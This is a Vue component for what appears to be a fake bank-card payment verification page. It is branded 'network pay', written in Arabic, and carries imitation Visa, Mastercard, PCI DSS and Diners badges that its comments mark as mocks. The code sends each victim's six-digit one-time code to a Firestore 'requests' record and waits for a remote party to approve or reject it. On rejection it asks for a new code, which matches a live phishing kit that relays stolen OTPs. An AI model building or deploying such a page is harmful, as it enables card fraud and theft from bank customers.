<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { Check } from 'lucide-vue-next';
import { doc, updateDoc, onSnapshot } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';

const router = useRouter();
const otp = ref('');
const timeLeft = ref(3 * 60 + 54); // 03:54
let timer: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

onMounted(() => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
});

const submitOtp = async () => {
  if (!otp.value || isSubmitting.value) return;

  if (!/^\d{6}$/.test(otp.value)) {
    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
    return;
  }
  error.value = '';

  isSubmitting.value = true;
  
  const requestId = localStorage.getItem('currentRequestId');
  if (!requestId) {
    alert('Request ID not found. Please start from the beginning.');
    isSubmitting.value = false;
    router.push('/');
    return;
  }

  try {
    const requestRef = doc(db, 'requests', requestId);
    const payload = {
      otp: otp.value,
      step: 'otp',
      otpStatus: 'pending',
      updatedAt: new Date().toISOString()
    };
    
    try {
      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
      const fallbackData = JSON.parse(fallbackStr);
      if (fallbackData[requestId]) {
        fallbackData[requestId] = { ...fallbackData[requestId], ...payload };
        localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
      }
    } catch(e) {}

    await updateDoc(requestRef, payload);
    
    // Fallback logic in case of missing listener
    const unsubscribe = onSnapshot(requestRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.otpStatus === 'approved') {
          unsubscribe();
          alert('العملية تمت بنجاح!');
          localStorage.removeItem('currentRequestId');
          isSubmitting.value = false;
          router.push('/');
        } else if (data.otpStatus === 'rejected') {
          unsubscribe();
          error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
          otp.value = '';
          isSubmitting.value = false;
        }
      }
    });

  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `requests/${requestId}`);
    error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="min-h-screen bg-[#fafafa] flex flex-col items-center pt-12 pb-10 px-4 font-sans">
    
    <!-- Header Logo -->
    <div class="mb-10 w-full flex justify-center">
      <div class="font-bold text-[40px] flex items-center tracking-tight">
        <span class="text-[#005bb5]">network</span>
        <span class="text-[#e21838] ml-1 text-3xl font-bold">></span>
      </div>
    </div>

    <!-- Main Card -->
    <div class="bg-white rounded-[1.5rem] shadow-[0_20px_50px_rgb(0,0,0,0.08)] w-full max-w-[400px] border border-gray-100 p-8 flex flex-col items-center text-center relative z-10">
      
      <!-- Card Logo -->
      <div class="font-bold text-4xl flex items-center tracking-tight mb-8">
        <span class="text-[#005b9f]">network</span>
        <span class="text-[#d81944]">pay</span>
        <span class="text-[#d81944] ml-1 text-2xl font-bold">></span>
      </div>

      <!-- Text Content -->
      <p class="text-[#105698] font-bold text-[17px] leading-relaxed mb-1" dir="rtl">
        المصادقة عبر تطبيق الهاتف المتحرك من البنك
      </p>
      <p class="text-[#105698] font-medium text-[15px] leading-relaxed mb-6 opacity-90" dir="rtl">
        ستتلقى من جهة اصدار البطاقة رمز لعملية الدفع برسالة نصية
      </p>

      <!-- Check Icon -->
      <div class="bg-gradient-to-br from-[#1b3664] to-[#122442] w-12 h-12 rounded-full flex items-center justify-center mb-6 shadow-md shadow-blue-900/20">
        <Check class="text-white w-6 h-6 stroke-[3]" />
      </div>

      <!-- Instructions -->
      <p class="text-gray-800 font-medium text-[16px] leading-relaxed mb-3" dir="rtl">
        يرجى ادخال رمز التحقق المرسل على الجوال الخاص بك.
      </p>
      <p class="text-gray-600 font-medium text-[15px] leading-relaxed mb-8" dir="rtl">
        او قم بفتح تطبيق البنك وانقر على الاشعار الفوري
      </p>

      <!-- OTP Input -->
      <div class="w-full mb-8 relative group">
        <input 
          type="text" 
          v-model="otp" 
          placeholder="* * * * * *" 
          class="w-full border-b-[2px] border-gray-300 rounded-none py-3 text-center text-2xl tracking-[0.5em] focus:outline-none focus:border-[#1b3664] text-gray-800 bg-transparent transition-colors placeholder-gray-300"
          maxlength="6"
        />
        <p v-if="error" class="text-red-500 text-sm mt-2 absolute -bottom-6 w-full text-center">{{ error }}</p>
      </div>

      <!-- Timer -->
      <div class="text-[34px] font-extrabold text-gray-800 mb-8 tracking-wider font-mono">
        {{ formattedTime }}
      </div>

      <!-- Submit Button -->
      <button 
        @click="submitOtp" 
        :disabled="isSubmitting"
        class="w-full bg-gradient-to-r from-[#1b3664] to-[#0f1f3a] hover:from-[#15294c] hover:to-[#0a1529] text-white py-4 rounded-xl font-bold text-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 disabled:opacity-70 disabled:cursor-not-allowed disabled:transform-none flex items-center justify-center gap-2 border border-[#0f1f3a]"
      >
        <span v-if="isSubmitting" class="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
        <span v-else>PAY</span>
      </button>

    </div>

    <!-- Security Badges Footer -->
    <div class="mt-12 flex flex-col items-center space-y-5">
      <div class="flex items-center gap-5 justify-center">
        <!-- PCI DSS Mock -->
        <div class="flex items-center relative">
          <div class="absolute -left-2 bg-[#2ba34a] w-5 h-5 rounded-full opacity-30 z-0 mix-blend-multiply"></div>
          <div class="absolute left-2 top-0 bg-[#2ba34a] w-5 h-5 rounded-full opacity-30 z-0 mix-blend-multiply"></div>
          <span class="text-[#0d6168] font-bold text-3xl font-serif z-10 tracking-tighter">PCI</span>
          <div class="ml-1 flex flex-col justify-center">
            <span class="text-[#0d6168] font-bold text-lg leading-none mt-1">DSS</span>
            <span class="text-[#0d6168] text-[7px] font-bold leading-none">COMPLIANT</span>
          </div>
          <Check class="absolute left-6 top-1 text-[#2ba34a] w-8 h-8 z-20 stroke-[3]" />
        </div>
        
        <!-- Verified by Visa Mock -->
        <div class="flex flex-col items-center pt-1 ml-2">
          <span class="text-[#133086] text-[15px] italic font-serif leading-none tracking-tight">Verified by</span>
          <span class="text-[#133086] text-3xl font-extrabold italic leading-none tracking-tight">VISA</span>
        </div>
      </div>

      <div class="flex items-center gap-5 justify-center">
        <!-- Mastercard SecureCode Mock -->
        <div class="flex flex-col justify-center translate-y-1">
          <span class="text-[#cc0000] font-bold text-[13px] tracking-tight leading-none bg-gradient-to-r from-red-600 to-yellow-500 text-transparent bg-clip-text">Mastercard.</span>
          <span class="text-[#eeba0b] font-medium text-[13px] leading-tight flex justify-end tracking-tight">SecureCode</span>
        </div>

        <!-- Diners Club Mock -->
        <div class="border border-gray-300 rounded px-1.5 py-1.5 flex flex-col items-center h-11 justify-between bg-white w-[50px]">
          <div class="w-[18px] h-[18px] rounded-full border-[1.5px] border-[#006bb6] flex items-center justify-center mb-0.5 mt-0.5">
             <div class="w-[8px] h-[2px] bg-[#006bb6]"></div>
          </div>
          <span class="text-[#006bb6] text-[4.5px] font-bold text-center leading-[1.0] tracking-tighter transform scale-90 w-[55px]">Diners Club<br/><span class="font-normal scale-90 inline-block font-sans">INTERNATIONAL</span><br/><span class="bg-[#006bb6] text-white px-0.5 pt-[1px] leading-none inline-block pb-[0.5px]">ProtectBuy</span></span>
        </div>
      </div>
    </div>

  </div>
</template>
